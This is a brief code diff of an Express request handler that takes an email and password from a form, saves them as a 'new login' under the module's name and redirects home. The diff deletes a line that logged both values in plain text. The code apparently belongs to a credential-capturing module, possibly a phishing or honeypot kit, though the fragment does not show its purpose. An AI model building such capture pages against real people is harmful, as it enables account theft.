@@ -14,7 +14,6 @@ exports.execute = function (app, schemaUtils) {
         let pass = req.body.pass;
 
         if (email && pass) {
-            console.info(`Email: ${email} - Pass: ${pass}`);
             schemaUtils.saveNewLogin(exports.info.name, email, pass);
         }
         res.status(200).redirect('/');
